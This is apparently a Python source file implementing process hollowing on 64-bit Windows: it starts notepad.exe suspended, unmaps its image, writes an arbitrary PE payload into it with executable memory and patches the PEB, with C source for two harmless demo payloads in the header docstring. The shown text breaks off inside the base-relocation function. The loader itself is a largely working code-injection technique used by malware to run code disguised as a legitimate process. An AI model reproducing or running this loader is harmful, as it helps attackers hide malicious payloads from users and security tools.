"""
(prod) Process Hollowing Injection
- arch: x64 process on x64 systems / 64-bit / PE32+
- target: notepad.exe
- payload: various

Notes:
- this technique does NOT work with shellcode, as Windows loader expects PE file structure at base address
- this technique is quite complicated, best to read doc-strings alongside notes from GitHub Readme.mdm
- Applied fixes, work for all 3x potentials of VirtualAllocEx() address being returned

Steps:
------
- Create SUSPENDED process                     -> CreateProcessW()
- Unmap (hollow) process memory                -> NtUnmapViewOfSection()
- Re-allocated hollowed memory                 -> VirtualAllocEx()
- Write payload into allocated memory          -> WriteProcessMemory()

Apply fixes
- PEB patch
- Base Relocations
- IAT fixing
- Update Thread Context

- Resume original thread                       -> ResumeThread()

TO CONSIDER:
-------------
- implement import forwarding
- look into NtGetContextThread / NtSetContextThread




PAYLOADS:
---------
.cpp files that need compilation
- simple file+beep
- simple message box

[Payload] simple_file.cpp - write a file to disk, and genenrated an audible beep sound
Compile (VS Code -> x64 Native Tools cmd prompt) - cl.exe /MT /GS- /guard:cf- /O2 /Tc simple_file.cpp /link /GUARD:NO /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup kernel32.lib

        #include <windows.h>
        
        void mainCRTStartup() {
            HANDLE hFile = CreateFileA("C:\\Users\\Public\\hollowed.txt", 
                                        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
                                        FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD written;
                WriteFile(hFile, "Hollowing Successful!", 21, &written, NULL);
                CloseHandle(hFile);
            }
            Beep(1000, 500); // Audio cue
            TerminateProcess(GetCurrentProcess(), 0);
        }

[Payload] simple_msg.cpp - show simple message box
Compile (VS Code -> x64 Native Tools cmd prompt) - cl.exe /MT /GS- /O2 /Tc simple_msg.cpp /link /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup user32.lib kernel32.lib

        #include <windows.h>
        
        void mainCRTStartup() {
            // force a user32 call to initialize the subsystem -> GetDesktopWindow()
            GetDesktopWindow();
        
            // call MessageBox
            MessageBoxA(NULL, "Hollowed Process!", "Success", MB_OK);
        
            TerminateProcess(GetCurrentProcess(), 0);
        }
"""




import ctypes
from ctypes import wintypes
import msvcrt
import struct
import os


kernel32    = ctypes.WinDLL('kernel32.dll', use_last_error=True)
ntdll       = ctypes.WinDLL('ntdll.dll',    use_last_error=True)

# ----------------------------------
# Payloads - sample(s)
# ----------------------------------
payload = r"\simple_beep.exe"

# ----------------------------------
# CONSTANTS - functions
# ----------------------------------

# specify Target Process to hollow/hijack
TARGET_PROCESS = r"c:\windows\system32\notepad.exe"
TARGET_FILENAME = os.path.basename(TARGET_PROCESS)

# CreateProcessW() - samples
CREATE_NO_WINDOW    = 0x08000000
DETACHED_PROCESS    = 0x08
CREATE_SUSPENDED    = 0x04

# CONTEXT64() struct
CONTEXT_ALL     = 0x10001f 
CONTEXT_CONTROL = 0x100001 
CONTEXT_SIZE    = 1232
CONTEXT_BUFFER  = CONTEXT_SIZE + 16 # for alignment and padding

# NtQueryInformationProcess()
STATUS_MASK = 0xFFFFFFFF

# NtUnmapViewOfSection() - signed long values, for returned error codes
STATUS_SUCCESS                  = 0
STATUS_INVALID_HANDLE           = -1073741816
STATUS_INVALID_PARAMETER        = -1073741811
STATUS_NOT_MAPPED_VIEW          = -1073741799   # ref base address
STATUS_ACCESS_DENIED            = -1073741790
STATUS_PROCESS_IS_TERMINATING   = -1073741558
STATUS_INVALID_ADDRESS          = -1073741503

# ReadProcessMemory() - parsing PEB
IMAGE_BASE_OFFSET = 0x10

# VirtualAllocEx() / VirtualProtectEx ()
MEM_COMMIT              = 0x1000
MEM_RESERVE             = 0x2000
PAGE_NOACCESS           = 0x01
PAGE_READONLY           = 0x02
PAGE_READWRITE          = 0x04
PAGE_WRITECOPY          = 0x08
PAGE_EXECUTE            = 0x10
PAGE_EXECUTE_READ       = 0x20
PAGE_EXECUTE_READWRITE  = 0x40
PAGE_EXECUTE_WRITECOPY  = 0x80

# Stack and memory alignment
STACK_SIZE      = 0x1000    # 4KB (one page)
SHADOW_SPACE    = 0x20      # 32 bytes, (standard x64 calling convention)
RET_ADDR_SIZE   = 0x08      # 8 bytes (size of a 64-bit address)
ALIGNMENT_MASK  = ~0xF      # mask for 16-byte alignment

# x64 CONTEXT offsets for manual buffer packing
CTX_X64_RCX = 128
CTX_X64_RSP = 152
CTX_X64_RIP = 248
CTX_X64_CONTEXT_FLAGS = 48

# ----------------------------------
# CONSTANTS - PE file layout
# ----------------------------------

# ----- DOS e_lfanew offset ----- ptr to start of PE Header
PE_OFFSET                   = 0x3C  # 4 bytes

# ----- PE Signature ----- 
PE_SIGNATURE_SIZE           = 4

# ----- IMAGE_FILE_HEADER ----- 
FILE_HDR_SIZE               = 20

FILE_HDR_MACHINE            = 0x00  # 2 bytes
FILE_HDR_NUM_SECTIONS       = 0x02  # 2 bytes
FILE_HDR_TIMESTAMP          = 0x04  # 4 bytes
FILE_HDR_PTR_SYMBOL_TABLE   = 0x08  # 4 bytes
FILE_HDR_NUM_SYMBOLS        = 0x0C  # 4 bytes
FILE_HDR_SIZE_OF_OPT_HDR    = 0x10  # 2 bytes
FILE_HDR_CHARACTERISTICS    = 0x12  # 2 bytes

# ----- IMAGE_OPTIONAL_HEADER (samples) ----- 
OPT_HDR_MAGIC               = 0x00  # 2 bytes
OPT_HDR_ENTRY_POINT         = 0x10  # 4 bytes, Relative Virtual Address (RVA) of entry point
OPT_HDR_IMAGE_BASE          = 0x18  # 8 bytes 
OPT_HDR_SIZE_OF_IMAGE       = 0x38  # 4 bytes
OPT_HDR_SIZE_OF_HEADERS     = 0x3C  # 4 bytes

# ----- OPT_DATA DIRECTORIES ----- 
OPT_HDR_DATA_DIRECTORIES        = 0x70
DATA_DIRECTORY_SIZE             = 8     # 8 bytes, total size for one entry
NUM_DATA_DIRECTORIES            = 16

# ----- OPT_DATA DIRECTORY SUB-FIELDS ----- 
# offsets relative to each entry (below)
DATA_DIR_VIRTUAL_ADDRESS    = 0x00  # 4 bytes
DATA_DIR_SIZE               = 0x04  # 4 bytes

# ----- OPT_DATA DIRECTORY INDICES -----
DIR_EXPORT                  = 0
DIR_IMPORT                  = 1
DIR_RESOURCE                = 2
DIR_EXCEPTION               = 3
DIR_SECURITY                = 4
DIR_BASERELOC               = 5
DIR_DEBUG                   = 6
DIR_ARCHITECTURE            = 7
DIR_GLOBALPTR               = 8
DIR_TLS                     = 9
DIR_LOAD_CONFIG             = 10
DIR_BOUND_IMPORT            = 11
DIR_IAT                     = 12
DIR_DELAY_IMPORT            = 13
DIR_COM_DESCRIPTOR          = 14

# ----- IMAGE_SECTION_HEADER ----- 
SEC_HDR_SIZE                = 40    # 40 byte header size

SEC_HDR_NAME                = 0x00  # 8 bytes
SEC_HDR_VIRTUAL_SIZE        = 0x08  # 4 bytes
SEC_HDR_VIRTUAL_ADDRESS     = 0x0C  # 4 bytes
SEC_HDR_SIZE_OF_RAW_DATA    = 0x10  # 4 bytes
SEC_HDR_PTR_TO_RAW_DATA     = 0x14  # 4 bytes
SEC_HDR_PTR_TO_RELOC        = 0x18  # 4 bytes
SEC_HDR_LINENO_PTR          = 0x1C  # 4 bytes  
SEC_HDR_RELOC_COUNT         = 0x20  # 2 bytes  
SEC_HDR_LINENO_COUNT        = 0x22  # 2 bytes  
SEC_HDR_CHARACTERISTICS     = 0x24  # 4 bytes

SEC_HDR_RVA_AND_RAW_DATA_SIZE   = 12

# ----- RELOCATION TABLE BLOCKS -----
RELOC_BLOCK_HEADER_SIZE     = 8         # PageRVA and BlockSize, 4-Bytes each
RELOC_ENTRY_SIZE            = 2         # size of each TypeOffset entry (Bytes)
RELOC_TYPE_BITSHIFT         = 12        # Type, in top 4-bits of TypeOffset entry
RELOC_OFFSET_MASK           = 0x0FFF    # Offset, in bottom 12-bits of TypeOffset entry

# ----- IMPORT TABLE -----
IMAGE_IMPORT_DESCRIPTOR_SIZE    = 20
THUNK_SIZE_X64                  = 8
ORDINAL_FLAG_X64                = 0x8000000000000000
ORDINAL_MASK                    = 0xFFFF

# ----------------------------------
# Struct Definitions
# ----------------------------------

class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("nLength",                 wintypes.DWORD),
        ("lpSecurityDescriptor",    wintypes.LPVOID),
        ("bInheritHandle",          wintypes.BOOL),
    ]

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb",                wintypes.DWORD),
        ("lpReserved",        wintypes.LPWSTR),
        ("lpDesktop",         wintypes.LPWSTR),
        ("lpTitle",           wintypes.LPWSTR),
        ("dwX",               wintypes.DWORD),
        ("dwY",               wintypes.DWORD),
        ("dwXSize",           wintypes.DWORD),
        ("dwYSize",           wintypes.DWORD),
        ("dwXCountChars",     wintypes.DWORD),
        ("dwYCountChars",     wintypes.DWORD),
        ("dwFillAttribute",   wintypes.DWORD),
        ("dwFlags",           wintypes.DWORD),
        ("wShowWindow",       wintypes.WORD),
        ("cbReserved2",       wintypes.WORD),
        ("lpReserved2",       wintypes.LPBYTE),
        ("hStdInput",         wintypes.HANDLE),
        ("hStdOutput",        wintypes.HANDLE),
        ("hStdError",         wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess",    wintypes.HANDLE),
        ("hThread",     wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId",  wintypes.DWORD),    
    ]

# for querying Process Environment Block
# - PebBaseAddress required for parsing memory of a process
# - 48 bytes in size -> passed in ctypes.sizeof(pbi)

class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
    ("ExitStatus",                  ctypes.c_void_p),
    ("PebBaseAddress",              ctypes.c_void_p),
    ("AffinityMask",                ctypes.c_void_p),
    ("BasePriority",                ctypes.c_void_p),
    ("UniqueProcessId",             ctypes.c_void_p),
    ("InheritedFromUniqueProcessId",ctypes.c_void_p),
    ]


# ----------------------------------
# Function Prototypes
# ----------------------------------

# ------------------- kernel32.dll -------------------
kernel32.CloseHandle.argtypes = [ wintypes.HANDLE, ]  # hObject
kernel32.CloseHandle.restype = wintypes.BOOL

kernel32.CreateProcessW.argtypes =[
    wintypes.LPCWSTR,                       # lpApplicationName (opt)
    wintypes.LPWSTR,                        # [i/o] lpCommandLine (opt)
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpProcessAttributes (opt)
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpThreadAttributes (opt)
    wintypes.BOOL,                          # bInheritHandles
    wintypes.DWORD,                         # dwCreationFlags
    ctypes.c_void_p,                        # lpEnvironment (opt)
    wintypes.LPCWSTR,                       # lpCurrentDirectory (opt)
    ctypes.POINTER(STARTUPINFOW),           # lpStartupInfo
    ctypes.POINTER(PROCESS_INFORMATION),    # [o] lpProcessInformation
]
kernel32.CreateProcessW.restype = wintypes.BOOL

kernel32.CreateRemoteThread.argtypes = [
    wintypes.HANDLE,                        # hProcess
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpThreadAttributes
    ctypes.c_size_t,                        # dwStackSize
    ctypes.c_void_p,                        # lpStartAddress
    wintypes.LPVOID,                        # lpParameter
    wintypes.DWORD,                         # dwCreationFlags
    ctypes.POINTER(wintypes.DWORD),         # lpThreadId   
]
kernel32.CreateRemoteThread.restype = wintypes.HANDLE

kernel32.GetModuleHandleA.argtypes = [
    wintypes.LPCSTR ,        # lpModuleName
]
kernel32.GetModuleHandleA.restype = wintypes.HANDLE

kernel32.GetProcAddress.argtypes = [
    wintypes.HANDLE,        # Module
    wintypes.LPCSTR,        # lpProcName
    #ctypes.c_void_p,
]
kernel32.GetProcAddress.restype = ctypes.c_void_p

kernel32.GetThreadContext.argtypes = [
    wintypes.HANDLE,        # hThread
    ctypes.c_void_p,        # lpContext (no longer ctypes.Structure)
]
kernel32.GetThreadContext.restype = wintypes.BOOL

kernel32.LoadLibraryA.argtypes = [
    wintypes.LPCSTR,        # lpLibFileName
]
kernel32.LoadLibraryA.restype = wintypes.HMODULE

kernel32.ReadProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPCVOID,                   # lpBaseAddress
    wintypes.LPVOID,                    # [o] lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] lpNumberOfBytesRead
]
kernel32.ReadProcessMemory.restype = wintypes.BOOL

kernel32.SetThreadContext.argtypes = [
    wintypes.HANDLE,        # hThread
    ctypes.c_void_p,        # *lpContext (no longer ctypes.Structure)
]
kernel32.SetThreadContext.restype = wintypes.BOOL

kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE,        # hProcess
    wintypes.LPVOID,        # lpAddress (opt) (can be null)
    ctypes.c_size_t,        # dwSize
    wintypes.DWORD,         # flAllocationType
    wintypes.DWORD,         # flProtect
]
kernel32.VirtualAllocEx.restype = wintypes.LPVOID

kernel32.VirtualProtectEx.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpAddress
    ctypes.c_size_t,                    # dwSize
    wintypes.DWORD,                     # flNewProtect (see CONSTANTS)
    ctypes.POINTER(wintypes.DWORD),     # [o] lpflOldProtect
]
kernel32.VirtualProtectEx.restype = wintypes.BOOL

kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpBaseAddress
    wintypes.LPCVOID,                   # lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] *lpNumberOfBytesWritten
]
kernel32.WriteProcessMemory.restype = wintypes.BOOL

# ------------------- ntdll.dll -------------------
ntdll.NtQueryInformationProcess.argtypes = [
        wintypes.HANDLE,                # ProcessHandle
        ctypes.c_int,                   # ProcessInformationClass
        ctypes.c_void_p,                # [o] ProcessInformation
        ctypes.c_ulong,                 # ProcessInformationLength
        ctypes.POINTER(ctypes.c_ulong), # [o] ReturnLength (opt)
]
ntdll.NtQueryInformationProcess.restype = ctypes.c_long

ntdll.NtUnmapViewOfSection.argtypes = [
    wintypes.HANDLE,        # ProcessHandle
    ctypes.c_void_p,        # BaseAddress (opt)
]
ntdll.NtUnmapViewOfSection.restype = ctypes.c_long


# ----------------------------------
#       Function Definitions
# ----------------------------------

# ==================== Helper Functions - Misc ====================
def winerr() -> OSError:
    """ Return a ctypes.WinError() with the last Windows API error """
    return ctypes.WinError(ctypes.get_last_error())


def close_handle(handle: wintypes.HANDLE, name: str="Handle") -> None:
    """ Close open handles, to avoid resource leaks """
    print(f"[+] Closing Handle {handle.value} to {name}: ", end='', flush=True)

    if handle is None or handle.value == 0:
        print(f"[!] Warning: {name} is None or invalid, nothing to close")
        return

    if not kernel32.CloseHandle(handle):
        print(f"Failed! Error: {winerr()}")
    else:
        print(f"Successful")


# ==================== Helper functions - PE Parsing ====================
#
# [DOS Header: e_lfanew] ---\    [DOS Stub]   /--> [PE Header]
#                            \_ _ _ _ _ _ _ _/
#
# e_lfanew ->   [PE Signature       - 4 bytes]
#               [File Header        - 20 bytes]
#               [Optional Header    - variable]
#               [Section Table      - num. Sections x 40bytes]


# ----- Offset-Of -----
def get_pe_header_offset(f: object) -> int:
    f.seek(PE_OFFSET)
    pe_offset = struct.unpack('<I', f.read(4))[0]

    return pe_offset

def get_file_header_offset(f: object) -> int:
    pe_offset = get_pe_header_offset(f)
    file_header_offset = pe_offset + PE_SIGNATURE_SIZE

    return file_header_offset

def get_import_dir_offset(f: object) -> int:
    optional_header_offset = get_optional_header_offset(f)
    import_dir_offset = optional_header_offset + OPT_HDR_DATA_DIRECTORIES + (DIR_IMPORT * DATA_DIRECTORY_SIZE)
    
    return import_dir_offset

def get_optional_header_offset(f: object) -> int:
    pe_offset = get_pe_header_offset(f)
    opt_header_offset = pe_offset + PE_SIGNATURE_SIZE + FILE_HDR_SIZE

    return opt_header_offset

def get_reloc_dir_offset(f: object) -> int:
    optional_header_offset = get_optional_header_offset(f)
    reloc_dir_offset = optional_header_offset + OPT_HDR_DATA_DIRECTORIES + (DIR_BASERELOC * DATA_DIRECTORY_SIZE)
    
    return reloc_dir_offset
    
def get_section_table_offset(f: object) -> int:
    pe_offset = get_pe_header_offset(f)
    size_optional_header = get_size_optional_header(f)
    section_table_offset = pe_offset + PE_SIGNATURE_SIZE + FILE_HDR_SIZE + size_optional_header

    return section_table_offset

def get_size_of_image_offset(f: object) -> int:
    optional_header_offset = get_optional_header_offset(f)
    size_of_image_offset = optional_header_offset + OPT_HDR_SIZE_OF_IMAGE
    
    return size_of_image_offset

# ----- Size-Of -----
def get_size_optional_header(f: object) -> int:
    file_header_offset = get_file_header_offset(f)
    f.seek(file_header_offset + FILE_HDR_SIZE_OF_OPT_HDR)
    size_of_opt_header = struct.unpack('<H', f.read(2))[0]

    return size_of_opt_header

def get_size_of_headers(f: object) -> int:
    optional_header_offset = get_optional_header_offset(f)
    f.seek(optional_header_offset + OPT_HDR_SIZE_OF_HEADERS)
    size_of_headers = struct.unpack('<I', f.read(4))[0]

    return size_of_headers

def get_size_of_image(f: object) -> int:
    """ SizeOfImage in memory, NOT size on disk: SizeOfImage > SizeOfFileOnDisk """
    size_of_image_offset = get_size_of_image_offset(f)
    f.seek(size_of_image_offset)
    size_of_image = struct.unpack('<I', f.read(4))[0]

    return size_of_image

# ----- Number-Of -----
def get_number_of_sections_in_section_table(f: object) -> int:
    file_header_offset = get_file_header_offset(f)
    f.seek(file_header_offset + FILE_HDR_NUM_SECTIONS)
    num_sections = struct.unpack('<H', f.read(2))[0]

    return num_sections


# ==================== Main Function Definitions ====================


# -------------------- Selection --------------------
# 
# create_process()

def create_process() -> tuple[
                            wintypes.HANDLE, 
                            wintypes.HANDLE, 
                            wintypes.DWORD, 
                            wintypes.DWORD]:
    """ 
    Create process in SUSPENDED state (default)
    - return HANDLEs and Ids to thread/process
    """

    # define args
    lpStartupInfo = STARTUPINFOW()
    lpStartupInfo.cb = ctypes.sizeof(STARTUPINFOW)
    lpProcessInformation = PROCESS_INFORMATION()

    # spawn process
    if not kernel32.CreateProcessW(
        TARGET_PROCESS, None, None, None, False,
        CREATE_SUSPENDED, None, None, 
        ctypes.byref(lpStartupInfo), 
        ctypes.byref(lpProcessInformation)
    ):
        raise winerr()

    print(f"    -> Process Created: {TARGET_FILENAME}")
    print(f"    -> Process Id:      {lpProcessInformation.dwProcessId}")
    print(f"    -> Thread Id:       {lpProcessInformation.dwThreadId}")
    
    # return handles/Ids to thread and process
    return (
        wintypes.HANDLE(lpProcessInformation.hThread),
        wintypes.HANDLE(lpProcessInformation.hProcess),  
        lpProcessInformation.dwThreadId,
        lpProcessInformation.dwProcessId
    )

# ==================== [ ALLOCATION ] ====================

# --------------- Unmap Memory (Hollowing) ---------------
#
# get_img_base_addr_va()
# hollow_process()

def get_img_base_addr_va(hProcess: wintypes.HANDLE) -> tuple[pbi: PROCESS_BASIC_INFORMATION, ctypes.c_void_p]:
    """
    Return the ImageBaseAddress, of the process to be hollowed
    - found in the PEB (Process Environment Block)
    - it is the virtual address in memory, where .exe file will be loaded
    - functions, variables etc inside program, are all located at specific offsets relative to this address
    - required to navigate process'memory -> read PE header, find entry point etc

    Note: PBI() struct returned for later PEB patching

    Step 1:
    - call NtQueryInformationProcess() <- PBI() populated
    
    Step 2:
    - from PBI(), query 'PebBaseAddress'
    - PebBaseAddress is a pointer to where PEB starts in memory
    - at offset 0x10 (from PebBaseAddress), sits ImageBaseAddress
    - read PEB at PebBaseAddress + OFFSET <- ReadProcessMemory()

    Glossary
    - PBI, Process Basic Information (struct)
    - PEB, Process Environment Block (struct)
    """

    # ----- Step 1: populate PBI struct
    pbi = PROCESS_BASIC_INFORMATION()
    pi_len = ctypes.c_ulong()
    
    # second arg, 0 == return ProcessBasicInformation
    status = ntdll.NtQueryInformationProcess(hProcess, 0, ctypes.byref(pbi), ctypes.sizeof(pbi), ctypes.byref(pi_len))
    
    if status != 0:
        print(f"[!] Failed to query process info: {hex(status & STATUS_MASK)}")
        raise winerr()

    # ----- Step 2: query PebBaseAddress
    image_base = ctypes.c_void_p()      # buffer to populate
    if not kernel32.ReadProcessMemory(
        hProcess,
        pbi.PebBaseAddress + IMAGE_BASE_OFFSET, # lpBaseAddress
        ctypes.byref(image_base),               # [o] lpBuffer
        ctypes.sizeof(image_base),
        None
    ):
        raise winerr()

    #print(f"    -> ImageBaseAddress ('{TARGET_FILENAME}'): {hex(image_base.value)}")
    
    msg = f"-> ImageBaseAddress ('{TARGET_FILENAME}'):"
    print(f"    {msg:<40} {hex(image_base.value)}")
    return pbi, image_base.value


def hollow_process(hProcess: wintypes.HANDLE, base_addr: ctypes.c_void_p) -> None:
    """ Unmap ('hollow out') the memory address space of target process """
    status = ntdll.NtUnmapViewOfSection(hProcess, base_addr)

    if status != 0:
        print(f"[!] Failed, Status Code: {status}")
        raise winerr()

    msg = "-> Un-mapped process memory address:"
    print(f"    {msg:<40} {hex(base_addr)}")


# ------------------- Allocate Memory ---------------------
#
# get_preferred_image_base_va()
# allocate_memory()

def get_preferred_image_base_va(payload_path) -> int:
    """
    Return the 'Preferred Base' of PE/payload
    - memory address the payload prefers to be loaded at, commonly 0x140000000 for 64-binaries
    """
    
    with open(payload_path, 'rb') as f:
        
        # ImageBase at 0x18 in OptionalHeader
        optional_header_offset = get_optional_header_offset(f)
        image_base_offset = optional_header_offset + OPT_HDR_IMAGE_BASE
        
        f.seek(image_base_offset)
        # Read 8 bytes for 64-bit ImageBase
        preferred_base = struct.unpack('<Q', f.read(8))[0]
        
        print("\n[+] Obtaining Preferred Base Address for Payload")

        msg = "-> Preferred ImageBase address (payload):"
        print(f"    {msg:<45} {hex(preferred_base)}")
        return preferred_base


def allocate_memory(
    hProcess: wintypes.HANDLE,
    lpAddress: ctypes.c_void_p,
    dwSize: ctypes.c_size_t) -> wintypes.LPVOID:

    """
    Allocate memory-space in suspended remote-process
    - here we requesting a specific address (lpaddress)
    - if not available to be allocated, ptr= assignment should fail and error out

    Returns: base-address of allocated memory
    """

    print("\n[+] Allocating Memory at Base Address")

    # red flag but fine for PoC
    ptr = kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not ptr:
        raise winerr()
    
    msg = "-> Memory allocated, base address:"
    print(f"    {msg:<45} {hex(ptr)}")
    
    return ptr

# ==================== [ INJECTION ] ====================

# -------------------- Write Payload --------------------
#
# write_payload_headers()
# write_payload_sections()

def write_payload_headers(
    hProcess: wintypes.HANDLE,
    actual_base_address_va: wintypes.LPVOID,
    f: object) -> None:
    
    """ 
    Write PE Headers to memory
    - obtain SizeOfHeaders -> Optional Header
    - read in buffer from beginning of file -> write to base address
    """
    
    print("[+] Writing Payload - Headers")
    
    f.seek(0)
    header_size = get_size_of_headers(f)
    f.seek(0) # reset because above function has own f.seek() calls, and f pointer not at start of file
    header_buffer = f.read(header_size)
    
    bytes_written = ctypes.c_size_t(0)
    if not kernel32.WriteProcessMemory(
        hProcess, 
        ctypes.c_void_p(actual_base_address_va),     # explicitly casting here
        header_buffer, 
        header_size, 
        ctypes.byref(bytes_written)
    ):
        raise winerr()

    print(f"    -> Header Information written: {bytes_written.value} Bytes")
    print()


def write_payload_sections(
    hProcess: wintypes.HANDLE,
    actual_base_address_va: wintypes.LPVOID,
    f: object) -> None:
    
    """
    Write sections to memory
    - .text, .data, .rsrc, .reloc etc
    - parse on-disk payload
    - iterate through Section Table (array of IMAGE_SECTION_HEADER() structs)
    - write each section to their corresponding absolute address
    
    """

    print("[+] Writing Payload - Section Data")

    section_table_offset = get_section_table_offset(f) 
    num_sections = get_number_of_sections_in_section_table(f)
    
    for i in range(num_sections):

        current_section_offset = section_table_offset + (i * SEC_HDR_SIZE)
        
        # read name of the section (.data, .text etc)
        f.seek(current_section_offset)
        name_bytes = f.read(8)
        current_section_name = name_bytes.split(b'\x00')[0].decode(errors='ignore')

        """
        # ----- IMAGE_SECTION_HEADER ----- 
        SEC_HDR_SIZE                = 40    # 40 byte header size

        SEC_HDR_NAME                = 0x00  # 8 bytes
        SEC_HDR_VIRTUAL_SIZE        = 0x08  # 4 bytes
        SEC_HDR_VIRTUAL_ADDRESS     = 0x0C  # 4 bytes
        SEC_HDR_SIZE_OF_RAW_DATA    = 0x10  # 4 bytes
        SEC_HDR_PTR_TO_RAW_DATA     = 0x14  # 4 bytes


        Unpack from SectionHeader
        ------------------------------------
        v_addr (memory offset)
        - offset of where ENTIRE section will begin when loaded in memory
        - (eg .text, .data, .rsrc, .reloc etc)
        - relative to future Actual Base Address

        r_size
        - size of data to copy

        r_ptr (file offset)
        - 'PointerToRawData' field in Section Header
        - where current section begins (eg .text, .reloc) within file
        - absolute file offset, relative to beginning of file (0x00)
        """

        f.seek(current_section_offset + SEC_HDR_VIRTUAL_ADDRESS)
        v_addr, r_size, r_ptr = struct.unpack('<III', f.read(12))
                
        # ----- Write section-block to virtual memory of target process -----

        if r_size > 0:
            # jump to beginning of the current section block
            f.seek(r_ptr)
            section_bytes = f.read(r_size)
            
            # calculate absolute memory address for current section
            current_section_va = actual_base_address_va + v_addr
            
            bytes_written = ctypes.c_size_t(0)

            if not kernel32.WriteProcessMemory(
                hProcess, 
                ctypes.c_void_p(current_section_va), 
                section_bytes, 
                r_size, 
                ctypes.byref(bytes_written)
            ):
                raise winerr()

            print(f"    -> section {current_section_name:10} -> {hex(current_section_va)}\tsize (in/out): {hex(r_size)}/{hex(bytes_written.value)}")


# ==================== [ APPLY FIXES ] ====================

# --------------------- Helper Function(s) ----------------------

# rva_to_file_offset()
# - write_paylaod_sections() -> map/read/write sequential secitons
# - base_relocations()       -> translate reloc_va to pointer
# - iat_fix()                -> translate directories and import lookups 

def rva_to_file_offset(f:object, rva:int) -> int:
    """ 
    Overview:
    - Convert a Relative Virtual Address (RVA) -> raw file offset 

    Purpose:
    - take a known memory address (rva) of where data needs to go
    - find where that data is, in the on-disk payload/PE-file

    Steps:
    - iterate each block in the section table
    - determine if the CURRENT section is the correct section for the RVA
    
    Returns: 
    - file-offset where data table (of current section) exists in payload
    
    # ----- IMAGE_SECTION_HEADER ----- 
    SEC_HDR_SIZE                = 40    # 40 byte header size

    SEC_HDR_NAME                = 0x00  # 8 bytes
    SEC_HDR_VIRTUAL_SIZE        = 0x08  # 4 bytes
    SEC_HDR_VIRTUAL_ADDRESS     = 0x0C  # 4 bytes
    SEC_HDR_SIZE_OF_RAW_DATA    = 0x10  # 4 bytes
    SEC_HDR_PTR_TO_RAW_DATA     = 0x14  # 4 bytes
    SEC_HDR_PTR_TO_RELOC        = 0x18  # 4 bytes
    SEC_HDR_LINENO_PTR          = 0x1C  # 4 bytes  
    SEC_HDR_RELOC_COUNT         = 0x20  # 2 bytes  
    SEC_HDR_LINENO_COUNT        = 0x22  # 2 bytes  
    SEC_HDR_CHARACTERISTICS     = 0x24  # 4 bytes
    """

    section_table_offset = get_section_table_offset(f)
    num_sections = get_number_of_sections_in_section_table(f)
    
    for i in range(num_sections):
        # skip to VirtualSize in Section header -  unpack next 4 fields
        f.seek(section_table_offset + (i * SEC_HDR_SIZE) +  SEC_HDR_VIRTUAL_SIZE) 

        v_size, v_addr, r_size, r_ptr = struct.unpack('<IIII', f.read(16))

        """
        Check if target rva (passed in), falls within virtual boundaries of this section
        - start: v_addr
        - end:   v_addr + v_size

        [*] Note:
        - be mindful dealing with both memory/file-offset addressing here
        
        data_table_so
        - a pure delta (distance in bytes) between the target DataTable, and the start of the current section 
        - same value whether measured in memory, or by file-offsets
        - calculated as: rva - v_addr

        [*] Note: v_addr, rva
        ---------------------
        - both are offsets, relative to future ActualBaseAddress
        
        v_addr
        - offset of where ENTIRE section will begin when loaded in memory
        - (eg .text, or .reloc)

        rva
        - offset of where section DATA will begin when loaded in memory
        - (eg, Relocation Table, Import Table)

        [*] Note: r_ptr, data_table_offset
        ----------------------------------
        - both are absolute file offsets, relative to beginning of file (0x00)

        r_ptr
        - 'PointerToRawData' field in Section Header
        - where current section begins (eg .text, .reloc) within file

        data_table_offset
        - exact byte-position where the target DataTable exists
        - calculated as: r_ptr + data_table_so

        """
        if v_addr <= rva < (v_addr + v_size):

            # data_table_so = data_table_rva - section_start_va
            data_table_so = rva - v_addr

            # section_start_on_disk + data_table_so
            data_table_offset = r_ptr + data_table_so
            
            return data_table_offset

    return 0


# --------------------- PEB Patching ----------------------

def patch_peb(
    hProcess: wintypes.HANDLE, 
    pbi: PROCESS_BASIC_INFORMATION, 
    lpBaseAddress: int) -> None:

    """
    Patching the Process Environment Base (PEB)
    - ensuring ImageBaseAddress -> actual_base_address_va of payload
    """
    
    print(f"\n[+] Patching PEB to point to Actual Base Address")

    peb_image_base_ptr = pbi.PebBaseAddress + 0x10
    new_base_buffer = ctypes.c_uint64(int(lpBaseAddress))

    if not kernel32.WriteProcessMemory(
        hProcess,
        ctypes.c_void_p(peb_image_base_ptr),
        ctypes.byref(new_base_buffer),
        ctypes.sizeof(new_base_buffer),
        None
    ):
        print(f"[!] Failed to patch PEB: {winerr()}")
    else:
        print(f"    -> PEB Updated, now points to: {hex(lpBaseAddress)}")



# --------------------- BASE Relocations ----------------------


def base_relocations(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: int,
    preferred_base: int,
    payload_path: str) -> None:
    """
    Overview:
    ---------
    Here we manually perform Base Relocations
    - to address the Delta between the 'PreferredBaseAddress' and 'ActualBaseAddress'  in memory
    
    Note: if the payload is/can-be loaded at its PreferredBaseAddress, this step is not required

    Details:
    --------
    When a PE file executes, it has a 'PreferredBase' address
    - this is typically 0x140000000 for x64 binaries
    - when a file is compiled, the compiler generates pointers for components such as global variables and string constants
